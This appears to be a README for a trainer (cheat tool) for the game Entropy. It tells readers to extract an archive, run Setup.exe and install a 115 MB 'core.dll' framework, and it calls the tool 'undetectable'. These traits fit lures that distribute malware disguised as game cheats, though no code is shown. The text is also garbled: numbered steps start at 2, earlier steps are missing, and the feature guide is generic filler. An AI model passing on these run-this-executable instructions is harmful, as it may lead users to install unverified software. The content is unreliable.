## 🔥 Project Overview

**This tool** is a comprehensive trainer for **Entropy**. This trainer provides optional assistance for party management, character progression, inventory handling, and tactical battles. It is designed to reduce repetitive tasks while preserving Entropy's exploration, choices, mercenary recruitment, and turn-based combat systems.

**Target Audience:** Players who want a more relaxed way to explore Entropy, experiment with party builds, manage equipment, and experience its story without excessive difficulty or repeated grinding.

> **⚠️ IMPORTANT:** This tool is for **educational and private use only**. It does not modify any game files — all changes are temporary and reset when the game closes. The tool is **undetectable**, but **use it at your own risk**. Always back up your save files before use.

2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```

|

|-- core.dll <- Core framework (115 MB)

|-- config.ini <- Configuration file (966 KB)
```

### Step 4: Launch the Tool

2. Run `Setup.exe`.
3. The launcher window will appear.

### Step 5: Install Framework

1. In the launcher window, click **"Install Framework"**.
2. Wait for the confirmation message *"Framework successfully installed"*.

### Step 6: Launch the Game

1. Launch the game through the Setup launcher (click **"Play"**) or via the standard shortcut.
2. In-game, press the configured hotkey to open the main control menu.

## 📖 Detailed Feature Guide

### Movement & Exploration

Explore the expansive world map, travel between settlements, and investigate dungeons and smaller locations. Use movement assistance only during normal exploration and avoid activating trainer options while transitioning between areas.

### Tools & Inventory

Collect weapons, armor, spells, treasure, and other rewards during the journey. Open the inventory or character screen before using inventory-related options, and allow values to refresh after equipping or moving an item.

### World & Environment

The adventure begins in Draenog and expands through towns, dungeons, hostile wilderness, quests, characters, and challenges. Save before entering new locations or making important choices, especially while playing the Early Access version.

### Combat & Weapons

Entropy uses tactical, turn-based battles with parties of up to six characters. Select actions carefully, manage each character's equipment and abilities, and activate combat assistance only after the battle has fully loaded.
